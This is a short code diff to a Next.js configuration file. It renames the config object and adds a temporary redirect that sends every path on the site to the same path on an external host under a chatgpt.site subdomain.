@@ -1,7 +1,13 @@
 import type { NextConfig } from "next";
 
-const nextConfig: NextConfig = {
-  /* config options here */
+const config: NextConfig = {
+  async redirects() {
+    return [{
+      source: "/:path*",
+      destination: "https://globe-bridge-offer-desk.mohamedaloui01984.chatgpt.site/:path*",
+      permanent: false,
+    }];
+  },
 };
 
-export default nextConfig;
+export default config;
